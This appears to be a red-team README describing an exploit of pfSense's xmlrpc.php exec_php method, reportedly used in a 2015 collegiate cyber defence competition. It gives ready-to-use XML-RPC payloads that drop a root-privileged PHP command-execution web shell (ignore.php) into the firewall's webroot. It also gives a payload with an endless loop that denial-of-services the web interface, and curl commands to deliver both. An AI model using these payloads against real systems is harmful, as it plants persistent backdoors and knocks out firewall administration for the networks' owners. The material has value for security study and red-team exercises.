# Quick Introduction

This is a sample payload and example use of abusing pfSense's xmlrpc.php functions to establish a backdoor
and get root level access to pfSense firewalls.

This exploit is post-auth (for the admin account) and as it stands is considered a non-issue according to 
the pfSense security team, since this password is shared for both the web and ssh services (ssh wasn't WAN 
accessible when this was used). This authentication method bypasses security rules  that apply to auth attempts 
against the web and is treated as a `local_backed` authentication attempt.  Any PHP shells that are dropped
to web root will run with full root perms.  It is also worth noting the web server appears to be single threaded
so spinning up a long running exec (such as a loop or ping without count) will effectively DoS the web server
and stop web based authentication and administration.

This was discovered during the 2015 [SECCDC](http://en.wikipedia.org/wiki/Southeastern_Collegiate_Cyber_Defense_Competition) 
competition and was used to drop active backdoors on teams firewalls. I am releasing it because I thought it was interesting and could be handy 
for other Red Teams.  

## The XML PHP backdoor payload
This payload can be sent to the pfSense box, it will utilize the `pfsense.exec_php` method to write a very simple 
php backdoor named `ignore.php` to the webroot on the firewall.

```
<?xml version="1.0" encoding="iso-8859-1"?>
<methodCall>
<methodName>pfsense.exec_php</methodName>
<params>
<param><value><string>password</string></value></param>
<param><value><string>exec('echo \'&lt;pre&gt; &lt;?php $res = system($_GET["cmd"]); echo $res ?&gt; &lt;/pre&gt;\' > /usr/local/www/ignore.php');</string></value></param>
</params>
</methodCall>
```

## Simple usage
Using this payload against the pfSense xmlrpc.php file is a simple HTTP request using curl

```
curl --data pfsense_exec http://10.10.100.1/xmlrpc.php
```

## The backdoor in use at SECCDC
![ignore.php in use](/images/backdoored.png)

## The XML DoS
This payload can be sent to the pfSense box, it will lock up the web server so web based authentication and
administration will not function.

```
<?xml version="1.0" encoding="iso-8859-1"?>
<methodCall>
<methodName>pfsense.exec_php</methodName>
<params>
<param><value><string>password</string></value></param>
<param><value><string>exec('while true; do sleep 1; done');</string></value></param>
</params>
</methodCall>
```

## Simple usage
Using this payload against the pfSense xmlrpc.php file is a simple HTTP request using curl

```
curl --data pfsense_dos http://10.10.100.1/xmlrpc.php
```



